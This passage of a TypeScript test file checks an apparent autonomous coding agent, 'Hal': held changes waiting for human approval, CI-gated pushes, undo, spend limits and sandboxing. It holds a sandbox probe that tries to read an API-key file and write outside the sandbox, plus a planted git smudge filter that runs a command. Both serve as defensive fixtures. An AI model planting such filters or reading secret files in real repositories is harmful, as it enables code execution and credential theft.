      put(call.cwd, 'hal-asks.patch', `diff --git a/${JUDGE} b/${JUDGE}\n--- a/${JUDGE}\n+++ b/${JUDGE}\n@@ -1,3 +1,3 @@\n import x;\n-expect(sectors).toBe(3);\n+expect(sectors).toBe(SECTORS.length);\n // end\n`);
      return ok(`Done.\n${J({ changelog: 'A fourth sector.', summary: 'Added sector 4.', asks: WHY })}`);
    };
    await runNight(opts(), deps({ claude }));
    const r = readReport();
    expect(r.changes.map((c) => c.verdict)).toEqual(['held']);
    const pass = r.changes[0]!.pass;
    expect(r.changes[0]!.asks).toMatchObject({ why: WHY, paths: [JUDGE] });
    expect(r.changes[0]!.asks!.diff).toContain('+expect(sectors).toBe(SECTORS.length);');
    const ledger = JSON.parse(read(halDir, 'ledger.json')) as { passes: Array<{ id: string; kept: boolean; reasons: string[] }> };
    expect(ledger.passes.find((x) => x.id === pass)).toMatchObject({ kept: true, reasons: [`held: asks: ${WHY}`] });
    expect(gitIn(origin, 'show', `refs/heads/main:${JUDGE}`)).toContain('toBe(3)'); // never pushed by Hal
    calls.length = 0;
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [] }) })); // builds nothing: the held change still applies
    expect(calls.find((c) => c.role === 'planner')!.prompt).toContain(`- ${pass}: feature(hyperline): A fourth sector (Hal asks: waiting for Brian to OK a judge-file change: ${WHY})`);
    // 👍 ships both through the same path as a feature: replayed onto refs/hal/main, ci:local, pushed.
    const ci = vi.fn(async () => ({ ok: true, detail: 'passed' }));
    expect(await heldCommand('ship', pass, { push: true }, deps({ ciLocal: ci }))).toBe(0);
    expect(gitIn(origin, 'show', `refs/heads/main:${JUDGE}`)).toContain('SECTORS.length');
    expect(gitIn(origin, 'show', 'refs/heads/main:games/hyperline/game.js')).toContain('sectors = 4');
    expect(ci).toHaveBeenCalledWith(halHead());
  }, 180_000);
});

describe('models per role', () => {
  it('the implementer runs on implementerModel; the planner and director on model', async () => {
    await runNight(opts(), deps({ model: 'plan-model', implementerModel: 'build-model' }));
    const byRole = Object.fromEntries(calls.map((c) => [c.role, c.model]));
    expect(byRole).toMatchObject({ planner: 'plan-model', implementer: 'build-model', director: 'plan-model' });
  }, 60_000);
  it('without implementerModel the implementer uses model', async () => {
    await runNight(opts(), deps({ model: 'one-model' }));
    expect(new Set(calls.map((c) => c.model))).toEqual(new Set(['one-model']));
  }, 60_000);
});

describe('push', () => {
  it('ci:local fails once and passes on a re-run (flaky): pushed, with a warning naming the first failure', async () => {
    let n = 0;
    const ci = vi.fn(async () => (++n === 1 ? { ok: false, detail: 'failed: test\nflaky timing' } : { ok: true, detail: 'passed' }));
    await runNight(opts(), deps({ ciLocal: ci }));
    const r = readReport();
    expect(r.pushed).toBe(true);
    expect(ci).toHaveBeenCalledTimes(2);
    expect(originMain()).toBe(halHead());
    expect(r.warnings.join('\n')).toMatch(/failed once .* and passed when run again .*flaky timing/s);
  }, 60_000);
  it('origin/main fails ci:local too: not Hal\'s to fix, so not pushed, nothing undone, and the warning says it needs Brian', async () => {
    const before = originMain();
    const ci = vi.fn(async () => ({ ok: false, detail: 'failed: test\nbroken on main' }));
    await runNight(opts(), deps({ ciLocal: ci }));
    const r = readReport();
    expect(ci.mock.calls.map((a) => (a as unknown as [string])[0])).toEqual([halHead(), halHead(), before]);
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/origin\/main/);
    expect(r.warnings.join('\n')).toMatch(/fails on origin\/main itself.*it needs you.*broken on main/s);
    expect(r.changes[0]!.verdict).toBe('merged'); // kept on refs/hal/main, not undone
    expect(existsSync(join(halDir, 'feedback.json')) ? feedback().undos : []).toEqual([]);
    expect(originMain()).toBe(before);
  }, 60_000);
  it('Hal\'s change breaks ci:local while origin/main passes: Hal undoes that change itself, records why for the planner, and pushes', async () => {
    const before = originMain();
    let broken = '';
    const ci = vi.fn(async (sha: string) => {
      // Any commit containing the merged change fails, until it is reverted.
      const has = gitIn(repo, 'show', `${sha}:games/hyperline/game.js`).includes('1.2');
      if (has) { broken ||= sha; return { ok: false, detail: 'failed: test\nhyperline-speed.test.ts: speed must stay under 1' }; }
      return { ok: true, detail: 'passed' };
    });
    await runNight(opts(), deps({ ciLocal: ci }));
    const r = readReport();
    expect(r.changes[0]!.verdict).toBe('merged');
    expect(r.pushed).toBe(true);
    expect(originMain()).toBe(halHead());
    expect(gitIn(repo, 'log', '-1', '--format=%s', halHead())).toMatch(/^revert\(hyperline\): undo/);
    expect(gitIn(repo, 'log', '-1', '--format=%B', halHead())).not.toContain('speed must stay under'); // player-facing text stays clean
    expect(gitIn(repo, 'show', `${halHead()}:games/hyperline/CHANGELOG.md`)).toContain(CI_UNDO_REASON);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'done', reason: expect.stringMatching(/^ci:local failed on this change after it merged .*: failed: test; failing tests: hyperline-speed\.test\.ts$/) })]);
    expect(feedback().undos[0]!.reason).not.toContain('speed must stay under'); // no raw test output for the planner
    expect(r.warnings.join('\n')).toMatch(/ci:local failed on HAL-001 .* Hal undid it/);
    expect(before).not.toBe(originMain());
  }, 60_000);
  /** Hal gets an unpushed commit writing `halText` to `halFile`; origin then moves on with OTHER.txt = 'x'. Returns Hal's commit. */
  const diverge = async (halFile: string, halText: string) => {
    await ensureMainWorktree(repo);
    const other = join(dirname(repo), 'other');
    gitIn(dirname(repo), 'clone', '-q', origin, other);
    for (const [k, v] of [['user.name', 'o'], ['user.email', 'o@o']]) gitIn(other, 'config', k!, v!);
    put(other, halFile, halText); gitIn(other, 'add', '-A'); gitIn(other, 'commit', '-q', '-m', 'hal only');
    gitIn(repo, 'fetch', '-q', other, 'HEAD');
    const halOnly = gitIn(repo, 'rev-parse', 'FETCH_HEAD');
    gitIn(repo, 'update-ref', HAL_MAIN, halOnly);
    gitIn(other, 'reset', '-q', '--hard', 'HEAD~1');
    put(other, 'OTHER.txt', 'x\n'); gitIn(other, 'add', '-A'); gitIn(other, 'commit', '-q', '-m', 'other'); gitIn(other, 'push', '-q', 'origin', 'main');
    return halOnly;
  };
  it('diverged but replayable: Hal replays its commit onto origin/main, ci:local checks it first, and the run goes on', async () => {
    const halOnly = await diverge('HAL.txt', 'hal\n');
    const onto = originMain();
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await runNight(opts(), deps({ ciLocal: ci }))).toBe(0);
    const r = readReport();
    expect(r.pushSkippedReason ?? '').not.toMatch(/diverged/);
    expect(r.warnings.join('\n')).toMatch(/Hal replayed 1 of its commits onto origin\/main and ci:local passed/);
    const replayed = (ci.mock.calls[0] as unknown as [string])[0];
    expect(gitIn(repo, 'rev-parse', `${replayed}^`)).toBe(onto); // the replay was checked before anything was built on it
    expect(gitIn(repo, 'log', '-1', '--format=%s', replayed)).toBe('hal only');
    expect(replayed).not.toBe(halOnly);
    gitIn(repo, 'merge-base', '--is-ancestor', replayed, halHead()); // Hal built on the replay
    expect(gitIn(repo, 'show', `${halHead()}:HAL.txt`)).toBe('hal');
    expect(gitIn(repo, 'show', `${halHead()}:OTHER.txt`)).toBe('x');
  }, 60_000);
  it('diverged and ci:local fails on the replay: report-only, refs/hal/main untouched', async () => {
    const halOnly = await diverge('HAL.txt', 'hal\n');
    const ci = vi.fn(async () => ({ ok: false, detail: 'tests broke' }));
    expect(await runNight(opts(), deps({ ciLocal: ci }))).toBe(0);
    const r = readReport();
    expect(r.pushSkippedReason).toMatch(/diverged/);
    expect(r.changes).toEqual([]);
    expect(halHead()).toBe(halOnly);
    expect(r.warnings.join('\n')).toMatch(/ci:local failed on the replayed commits .*tests broke/);
  }, 60_000);
  it('diverged on a --report-only run: no replay, refs/hal/main untouched', async () => {
    const halOnly = await diverge('HAL.txt', 'hal\n');
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ ciLocal: ci }))).toBe(0);
    expect(halHead()).toBe(halOnly);
    expect(ci).not.toHaveBeenCalled();
    expect(readReport().warnings.join('\n')).toMatch(/--report-only, so Hal did not try/);
  }, 60_000);
  it('triage blames the first commit that fails twice: a one-off failure on an earlier good change does not get it undone', async () => {
    const seen = new Map<string, number>();
    const ci = vi.fn(async (sha: string) => {
      const file = gitIn(repo, 'show', `${sha}:games/hyperline/game.js`);
      const n = (seen.get(sha) ?? 0) + 1; seen.set(sha, n);
      if (file.includes('trail')) return { ok: false, detail: 'failed: test\nhyperline-trail.test.ts: trail too long' };
      if (file.includes('1.2') && !file.includes('trail') && n === 1 && sha !== originMain()) return { ok: false, detail: 'failed: test\nflake' };
      return { ok: true, detail: 'passed' };
    });
    // Two changes: HAL-001 (speed 1.2) is fine, HAL-002 (adds a trail) breaks ci:local.
    await runNight(opts(), deps({ ciLocal: ci, claude: fakeClaude({ tickets: [GOOD, THIRD] }) }));
    const r = readReport();
    expect(r.changes.map((x) => x.verdict)).toEqual(['merged', 'merged']);
    expect(r.pushed).toBe(true);
    const undos = feedback().undos;
    expect(undos.map((u) => u.pass)).toEqual(['HAL-002']);
    expect(gitIn(repo, 'show', `${originMain()}:games/hyperline/game.js`)).not.toContain('trail');
  }, 90_000);
  it('an undo that does not make ci:local pass is taken back: nothing pushed, refs/hal/main as before, no undo recorded', async () => {
    const before = originMain();
    const ci = vi.fn(async (sha: string) => (sha === before ? { ok: true, detail: 'passed' } : { ok: false, detail: 'failed: test\nstill broken' }));
    let headBeforePush = '';
    const d = deps({ ciLocal: async (sha) => { headBeforePush ||= halHead(); return ci(sha); } });
    await runNight(opts(), d);
    const r = readReport();
    expect(r.pushed).toBe(false);
    expect(halHead()).toBe(headBeforePush);
    expect(gitIn(repo, 'log', '-1', '--format=%s', halHead())).not.toMatch(/^revert/);
    expect(existsSync(join(halDir, 'feedback.json')) ? feedback().undos : []).toEqual([]);
    expect(r.warnings.join('\n')).toMatch(/did not make it pass, so Hal took the undo back/);
    expect(originMain()).toBe(before);
  }, 60_000);
  it('R22: diverged with a conflict: the run is forced report-only, nothing built or pushed, recovery steps in a warning', async () => {
    const halOnly = await diverge('OTHER.txt', 'hal\n'); // the same file origin changes: conflict
    const before = originMain();
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    put(halDir, 'feedback.json', J({ votes: [], undos: [{ pass: 'HAL-001', reason: 'pending', at: NOW.toISOString(), status: 'pending' }] }));
    expect(await runNight(opts(), deps({ ciLocal: ci }))).toBe(0);
    const r = readReport();
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/diverged/);
    expect(r.changes).toEqual([]); // nothing built
    expect(calls.map((c) => c.role)).toEqual(['planner', 'director']);
    expect(halHead()).toBe(halOnly); // no merge, no history commit, no undo
    const w = r.warnings.join('\n');
    expect(w).toMatch(/could not replay its commits onto origin\/main \(.*hal only.*conflicts with origin\/main\): this run is report-only/);
    expect(w).toMatch(/NOT on origin\/main/);
    expect(w).toContain(`git log origin/main..${HAL_MAIN}`);
    expect(w).toMatch(new RegExp(`git update-ref ${HAL_MAIN} origin/main\`, which discards them`));
    expect(ci).not.toHaveBeenCalled();
    expect(originMain()).toBe(before);
  }, 60_000);
  it('--no-push keeps the commits local', async () => {
    const before = originMain();
    await runNight(opts({ push: false }), deps());
    const r = readReport();
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/no-push/);
    expect(originMain()).toBe(before);
  }, 60_000);
});

describe('spend under the lock', () => {
  it('records every call before the next one starts; an unknown API cost books the whole slice', async () => {
    seedSpend(0);
    const seen: unknown[] = [];
    await runNight(opts(), deps({
      claude: fakeClaude({ tickets: [GOOD], costs: { planner: null, 'Smoother jumps': 0.75 }, onCall: (call) => seen.push(spendCalls().map((x) => [x.role, x.usd, x.pending ?? false])) }),
    }));
    // During each call: its own reservation (full slice, pending) is already on disk, and every earlier call is settled.
    expect(seen).toEqual([
      [['planner', 1.5, true]],
      [['planner', 1.5, false], ['implementer', 3, true]],
      [['planner', 1.5, false], ['implementer', 0.75, false], ['director', 1, true]],
    ]);
    const c = spendCalls();
    expect(c.map((x) => [x.role, x.billing, x.usd])).toEqual([['planner', 'api', 1.5], ['implementer', 'api', 0.75], ['director', 'api', 0.2]]);
    expect(readReport().spend).toEqual({ api: 2.45, subscription: 0 });
  }, 60_000);
  it('a manual run uses the subscription first and the API for the rest of the run after a limit hit', async () => {
    const limit: ClaudeResult = { ok: false, text: "You've hit your limit", costUsd: null, subtype: 'error', limitHit: true, timedOut: false, stderrTail: '' };
    const claude: RunDeps['claude'] = async (call) => {
      calls.push(call);
      if (call.billing === 'subscription') return limit;
      if (call.role === 'planner') return ok(J({ tickets: [] }), 0.3);
      return ok(J({ note: 'n', perGame: {}, noteReplies: [] }), 0.1);
    };
    await runNight(opts({ trigger: 'manual', billing: 'subscription' }), deps({ claude }));
    expect(calls.map((c) => [c.role, c.billing])).toEqual([['planner', 'subscription'], ['planner', 'api'], ['director', 'api']]);
    expect(readReport()).toMatchObject({ billing: 'subscription', billingEnded: 'api' });
    expect(spendCalls().map((x) => [x.role, x.billing])).toEqual([['planner', 'subscription'], ['planner', 'api'], ['director', 'api']]);
    expect(readReport().warnings.join('\n')).toMatch(/limit/);
  });
  it('API billing with no key runs no Claude call and says so', async () => {
    const claude = vi.fn();
    expect(await runNight(opts(), deps({ claude, hasApiKey: false }))).toBe(0);
    expect(claude).not.toHaveBeenCalled();
    expect(readReport().warnings.join('\n')).toMatch(/no API key/);
  });
});

describe('signals', () => {
  it('SIGINT kills live Claude children and removes the lock', async () => {
    const proc = Object.assign(new EventEmitter(), { exit: vi.fn() });
    let child: ChildProcess | undefined;
    let lockAtExit: boolean | undefined;
    proc.exit.mockImplementation(() => { lockAtExit = existsSync(join(halDir, 'run.lock')); });
    const claude: RunDeps['claude'] = (call) => runClaude({ ...call, billing: 'subscription' }, {
      env: {}, now: Date.now,
      spawn: (_c, _a, o) => { child = spawn('sleep', ['30'], o); setTimeout(() => proc.emit('SIGINT'), 100); return child; },
    });
    await runNight(opts({ reportOnly: true }), deps({ claude, proc }));
    expect(proc.exit).toHaveBeenCalledWith(130);
    expect(lockAtExit).toBe(false);
    expect(child!.signalCode).toBe('SIGKILL');
    expect(proc.listenerCount('SIGINT')).toBe(0); // handlers removed in finally
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
});

// ---- undo ---------------------------------------------------------------------------------------------------------

/** Puts a Hal-style pass commit on refs/hal/main (game.js change + release), like a merged candidate. */
async function makePass(pass = 'HAL-001', o: { file?: string; text?: string; from?: string; to?: string } = {}): Promise<string> {
  const { file = 'game.js', text = 'export const speed = 1.2;\n', from = '0.3.1', to = '0.3.2' } = o;
  const { dir } = await ensureMainWorktree(repo);
  put(dir, `games/hyperline/${file}`, text);
  put(dir, 'games/hyperline/game.yaml', read(dir, 'games/hyperline/game.yaml').replace(from, to));
  put(dir, 'games/hyperline/index.html', read(dir, 'games/hyperline/index.html').replace(`'${from}'`, `'${to}'`));
  put(dir, 'games/hyperline/CHANGELOG.md', read(dir, 'games/hyperline/CHANGELOG.md').replace(`## ${from}`, `## ${to} (${NIGHT})\n- Jumps feel smoother.\n\n## ${from}`));
  put(dir, `docs/hal/history/hyperline/${NIGHT}/${pass}-before.jpg`, fakeJpeg(390, 844));
  const trailers = formatTrailers({ pass, game: 'hyperline', kind: 'tuning', why: 'Players miss the jump.', scoreBefore: 60, scoreAfter: 61, version: to, run: 'run-x' });
  gitIn(dir, 'add', '-A');
  gitIn(dir, 'commit', '-q', '-m', `tuning(hyperline): Smoother jumps\n\nPlayers miss the jump.\n\n${trailers}`);
  gitIn(repo, 'update-ref', HAL_MAIN, gitIn(dir, 'rev-parse', 'HEAD'));
  return halHead();
}
const feedback = () => JSON.parse(read(halDir, 'feedback.json')) as { undos: { pass?: string; status?: string; error?: string; reason: string }[]; held?: Array<Record<string, unknown>> };

describe('undo', () => {
  it('reverts the pass, writes a NEW patch version with an Undone bullet, commits Hal-Undo/Hal-Reason, records feedback', async () => {
    const passSha = await makePass();
    const brian = brianMain();
    expect(await undoCommand('HAL-001', 'too bouncy', { push: false }, deps())).toBe(0);
    expect(gitIn(repo, 'rev-parse', `${HAL_MAIN}^`)).toBe(passSha);
    const t = parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN))!;
    expect(t).toMatchObject({ undo: 'HAL-001', reason: 'too bouncy', version: '0.3.3', game: 'hyperline' });
    const show = (f: string) => gitIn(repo, 'show', `${HAL_MAIN}:games/hyperline/${f}`);
    expect(show('game.js')).toBe('export const speed = 1;');
    expect(show('game.yaml')).toMatch(/^version: 0\.3\.3$/m);
    expect(show('index.html')).toContain("version: '0.3.3'");
    expect(show('CHANGELOG.md')).toMatch(new RegExp(`## 0\\.3\\.3 \\(${NIGHT}\\)\\n- Undone: Smoother jumps \\(HAL-001\\): too bouncy\\n\\n## 0\\.3\\.2 \\(${NIGHT}\\)\\n- Jumps feel smoother\\.`));
    expect(gitIn(repo, 'show', '--stat', '--format=', HAL_MAIN)).not.toMatch(/history/); // the pictures stay as history
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'done', reason: 'too bouncy', version: '0.3.3' })]);
    expect(brianMain()).toBe(brian);
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
  it('pushes after ci:local unless --no-push', async () => {
    await makePass();
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await undoCommand('HAL-001', 'too bouncy', { push: true }, deps({ ciLocal: ci }))).toBe(0);
    expect(ci).toHaveBeenCalledWith(halHead());
    expect(originMain()).toBe(halHead());
  });
  it('a conflicting revert changes nothing, exits 1, and is saved to feedback.json for the next run', async () => {
    await makePass();
    const { dir } = await ensureMainWorktree(repo);
    put(dir, 'games/hyperline/game.js', 'export const speed = 1.4;\n');
    gitIn(dir, 'commit', '-q', '-am', 'later change to the same line');
    gitIn(repo, 'update-ref', HAL_MAIN, gitIn(dir, 'rev-parse', 'HEAD'));
    const head = halHead();
    expect(await undoCommand('HAL-001', 'too bouncy', { push: false }, deps())).toBe(1);
    expect(halHead()).toBe(head);
    expect(gitIn(dir, 'status', '--porcelain')).toBe('');
    expect(gitIn(dir, 'rev-parse', 'HEAD')).toBe(head);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'failed', error: expect.stringMatching(/conflict/) })]);
  });
  it('failing tests change nothing', async () => {
    await makePass();
    const head = halHead();
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [node(''), node('process.exit(3)')] }))).toBe(1);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]).toMatchObject({ status: 'failed', error: expect.stringMatching(/npm test failed/) });
  });
  it('the real path refuses to run the tests without the sandbox', async () => {
    await makePass();
    const head = halHead();
    const plat = Object.getOwnPropertyDescriptor(process, 'platform')!;
    Object.defineProperty(process, 'platform', { value: 'linux' });
    try {
      expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ unsandboxedForTests: false }))).toBe(1);
    } finally { Object.defineProperty(process, 'platform', plat); }
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.error).toMatch(/no sandbox/);
  });
  it('a test step that edits the tree fails the undo before the next step (tamper guard)', async () => {
    await makePass();
    const head = halHead();
    const tamper = node(`require('fs').writeFileSync('games/hyperline/game.js', 'export const speed = 9;\\n')`);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [tamper, node('')] }))).toBe(1);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.error).toMatch(/changed while the tests ran/);
  });
  it.runIf(sandboxAvailable())('darwin: the undo tests really run sandboxed (.hal.env unreadable, no writes outside, no key in env)', async () => {
    await makePass();
    put(repo, '.hal.env', `ANTHROPIC_API_KEY=${KEY}\n`);
    const outside = join(homedir(), `.hal-undo-sandbox-probe-${process.pid}`); // tmpdir (and so the temp repo) is writable by design
    const probe = node(`const fs=require('fs');const r=[];
      try{fs.readFileSync(${J(join(repo, '.hal.env'))});r.push('read:ok')}catch(e){r.push('read:'+e.code)}
      try{fs.writeFileSync(${J(outside)},'x');r.push('write:ok')}catch(e){r.push('write:'+e.code)}
      r.push('key:'+(Object.values(process.env).some(v=>String(v).includes(${J(KEY)}))?'yes':'none'));
      console.log(r.join(' '));process.exit(r.join(' ')==='read:EPERM write:EPERM key:none'?0:7)`);
    const prev = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = KEY;
    try {
      const code = await undoCommand('HAL-001', 'r', { push: false }, deps({ unsandboxedForTests: false, undoTest: () => [probe] }));
      expect(code, existsSync(join(halDir, 'feedback.json')) ? read(halDir, 'feedback.json') : '').toBe(0);
    } finally { if (prev === undefined) delete process.env.ANTHROPIC_API_KEY; else process.env.ANTHROPIC_API_KEY = prev; }
    const leaked = existsSync(outside);
    rmSync(outside, { force: true });
    expect(leaked).toBe(false);
  });
  it('an unknown pass exits 1; a busy lock exits 2', async () => {
    expect(await undoCommand('HAL-404', 'r', { push: false }, deps())).toBe(1);
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'other', startedAt: new Date().toISOString() }));
    expect(await undoCommand('HAL-404', 'r', { push: false }, deps())).toBe(2);
  });
  it('R5: hal undo also applies every other pending undo under its lock, then one ci:local and one push', async () => {
    await makePass('HAL-001');
    await makePass('HAL-002', { file: 'extra.js', text: 'export const extra = 1;\n', from: '0.3.2', to: '0.3.3' });
    put(halDir, 'feedback.json', J({ votes: [], undos: [
      { run: 'page', pass: 'HAL-001', reason: 'too bouncy', status: 'pending', at: NOW.toISOString() },
      { run: 'page', pass: 'HAL-002', reason: 'meh', status: 'pending', at: NOW.toISOString() },
    ] }));
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await undoCommand('HAL-001', 'too bouncy', { push: true }, deps({ ciLocal: ci }))).toBe(0);
    const u = feedback().undos;
    expect(u).toEqual([
      expect.objectContaining({ run: 'page', pass: 'HAL-001', status: 'done' }),
      expect.objectContaining({ run: 'page', pass: 'HAL-002', status: 'done' }),
    ]);
    expect(gitIn(repo, 'log', '--format=%B', HAL_MAIN).match(/^Hal-Undo: HAL-00[12]$/gm)).toHaveLength(2);
    expect(ci).toHaveBeenCalledTimes(1);
    expect(ci).toHaveBeenCalledWith(halHead());
    expect(originMain()).toBe(halHead());
    // A later spawn for a pass that is already done exits cleanly.
    expect(await undoCommand('HAL-002', 'meh', { push: false }, deps())).toBe(0);
  });
  it('R5: a hal undo that finds the lock busy exits 2 and leaves feedback.json untouched', async () => {
    await makePass();
    const fbText = J({ votes: [], undos: [{ run: 'page', pass: 'HAL-001', reason: 'r', status: 'pending', at: NOW.toISOString() }] });
    put(halDir, 'feedback.json', fbText);
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'other', startedAt: new Date().toISOString() }));
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps())).toBe(2);
    expect(read(halDir, 'feedback.json')).toBe(fbText);
  });
  it('preflight applies a pending undo from feedback.json the same way, and reports last run\'s ci:local failures', async () => {
    await makePass();
    put(halDir, 'feedback.json', J({ votes: [], undos: [{ run: 'page', pass: 'HAL-001', reason: 'too bouncy', status: 'pending', at: NOW.toISOString() }] }));
    put(repo, `.data/ci/${halHead()}.json`, J({ sha: halHead(), ok: false, steps: [{ step: 'test', ok: false }] }));
    // The previous run (run-x) pushed this commit.
    put(halDir, 'latest.json', J({ runId: 'run-x', endedAt: NOW.toISOString(), reportMd: join(halDir, 'runs', 'run-x', 'report.md') }));
    put(halDir, 'runs/run-x/report.json', J({ runId: 'run-x', pushed: true }));
    expect(await runNight(opts({ push: false }), deps({ claude: fakeClaude({ tickets: [] }) }))).toBe(0);
    expect(gitIn(repo, 'log', '--format=%B', HAL_MAIN)).toMatch(/^Hal-Undo: HAL-001$/m);
    // R3: the page's request keeps its run (the report's), so the report card finds it; the version it released is recorded.
    expect(feedback().undos).toEqual([expect.objectContaining({ run: 'page', pass: 'HAL-001', status: 'done', version: '0.3.3', undoRun: expect.stringMatching(/^run-/) })]);
    const w = readReport().warnings.join('\n');
    expect(w).toMatch(/undid HAL-001/);
    expect(w).toMatch(/ci:local failed for .* \(run-x\)/);
  });
});

describe('cli flags', () => {
  const games = ['hyperline', 'gearhold'];
  it('defaults: manual, subscription, push on, 6 tickets, all games', () => {
    expect(parseRunArgs([], games, {})).toEqual({ games, kinds: [], reportOnly: false, maxTickets: 6, trigger: 'manual', billing: 'subscription', push: true });
  });
  it('a paused game is left out of the default set; --game still runs it on purpose', () => {
    const paused = { hyperline: 'rebuild in progress' };
    expect(parseRunArgs(['--nightly'], games, paused).games).toEqual(['gearhold']);
    expect(parseRunArgs(['--game', 'hyperline'], games, paused).games).toEqual(['hyperline']);
  });
  it('Hyperline is paused while its renderer and art are rebuilt (Brian, 2026-11-25)', () => {
    expect(HAL_PAUSED.hyperline).toMatch(/quality-plan/);
    expect(parseRunArgs(['--nightly'], games).games).toEqual(['gearhold']);
  });
  it('--nightly bills the subscription first, with push (--billing api forces credits); --billing, --game, --kind, --max-tickets, --no-push, --report-only', () => {
    expect(parseRunArgs(['--nightly'], games)).toMatchObject({ trigger: 'nightly', billing: 'subscription', push: true });
    expect(parseRunArgs(['--nightly', '--billing', 'api'], games)).toMatchObject({ trigger: 'nightly', billing: 'api' });
    expect(parseRunArgs([], games)).toMatchObject({ trigger: 'manual', billing: 'subscription' });
    expect(parseRunArgs(['--billing', 'subscription', '--game', 'gearhold', '--report-only'], games)).toMatchObject({ games: ['gearhold'], billing: 'subscription', reportOnly: true });
    expect(parseRunArgs(['--kind', 'fix', '--kind', 'polish', '--max-tickets', '2', '--no-push'], games)).toMatchObject({ kinds: ['fix', 'polish'], maxTickets: 2, push: false });
    expect(() => parseRunArgs(['--game', 'nope'], games)).toThrow(/unknown game/);
    expect(() => parseRunArgs(['--kind', 'nope'], games)).toThrow(/kind/);
    expect(() => parseRunArgs(['--max-tickets', '0'], games)).toThrow(/max-tickets/);
    expect(() => parseRunArgs(['--billing', 'free'], games)).toThrow(/billing/);
  });
  it('undo needs a pass id and --reason', async () => {
    await expect(runRunCommand('undo', ['HAL-001'], { halDir, games })).rejects.toThrow(/reason/);
    await expect(runRunCommand('undo', ['nope', '--reason', 'x'], { halDir, games })).rejects.toThrow(/HAL-/);
  });
  it('--reason=<text> is one argv element: a reason starting with -- stays the reason (the report page spawns it this way)', async () => {
    const makeDeps = () => deps();
    await makePass();
    expect(await runRunCommand('undo', ['HAL-001', '--reason=--no-push'], { halDir, games, makeDeps })).toBe(0);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'done', reason: '--no-push' })]);
    expect(parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN))!).toMatchObject({ undo: 'HAL-001', reason: '--no-push' });
  });
});

describe('fix round 1', () => {
  it('R19: SIGINT during an API call leaves the whole slice booked in spend.json (reserved before the spawn)', async () => {
    seedSpend(0);
    const proc = Object.assign(new EventEmitter(), { exit: vi.fn() });
    let atExit: unknown;
    proc.exit.mockImplementation(() => { atExit = spendCalls().map((x) => [x.role, x.billing, x.usd, x.pending ?? false]); });
    const claude: RunDeps['claude'] = async (call) => { calls.push(call); if (call.role === 'planner') { proc.emit('SIGINT'); throw new Error('killed'); } return ok(J({ note: 'n', perGame: {}, noteReplies: [] }), 0.1); };
    await runNight(opts({ reportOnly: true }), deps({ claude, proc }));
    expect(proc.exit).toHaveBeenCalledWith(130);
    expect(atExit).toEqual([['planner', 'api', 1.5, true]]);
    expect(spendCalls()[0]).toMatchObject({ role: 'planner', usd: 1.5 }); // settled as unknown: the slice stays
    expect(spendCalls()[0]!.pending).toBeUndefined();
  });
  it('planner gets --add-dir for its screenshots; planner and director get <repo>/.hal.env and the home secrets as deny paths', async () => {
    await runNight(opts({ reportOnly: true }), deps());
    const r = readReport();
    const [planner, director] = calls;
    expect(planner!.addDirs).toEqual([join(halDir, 'runs', r.runId, 'play', 'screens')]);
    expect(existsSync(planner!.addDirs![0]!)).toBe(true);
    for (const c of [planner!, director!]) expect(c.denyReadPaths).toEqual(secretReadPaths(repo));
  });
  it('--report-only does not apply pending undos (and pushes nothing)', async () => {
    await makePass();
    const head = halHead();
    put(halDir, 'feedback.json', J({ votes: [], undos: [{ run: 'page', pass: 'HAL-001', reason: 'r', status: 'pending', at: NOW.toISOString() }] }));
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await runNight(opts({ reportOnly: true }), deps({ ciLocal: ci }))).toBe(0);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.status).toBe('pending');
    expect(ci).not.toHaveBeenCalled();
  });
  it('a candidate that reports "trust root modified" stops the build, warns to run npm ci, and nothing is pushed', async () => {
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    const candidate = vi.fn(async (t: Ticket, ctx: { pass: string }) => ({
      pass: ctx.pass, ticket: t, verdict: 'discarded' as const, reasons: ['trust root modified'], scoresBefore: {}, scoresAfter: {}, costUsd: 0,
      warnings: ['trust root modified: node_modules changed; reinstall it (npm ci)'],
    }));
    expect(await runNight(opts(), deps({ candidate, ciLocal: ci, claude: fakeClaude({ tickets: [GOOD, THIRD] }) }))).toBe(0);
    const r = readReport();
    expect(candidate).toHaveBeenCalledTimes(1);
    expect(r.changes.map((c) => c.reasons)).toEqual([['trust root modified'], ['stopped: trust root modified']]);
    expect(r.warnings.join('\n')).toMatch(/Run npm ci/);
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/trust root/);
    expect(ci).not.toHaveBeenCalled();
  });
  it('a filter driver in the repo config: the run refuses before any git or Claude (fail closed); so does undo', async () => {
    gitIn(repo, 'config', 'filter.evil.smudge', 'touch /tmp/hal-evil-smudge');
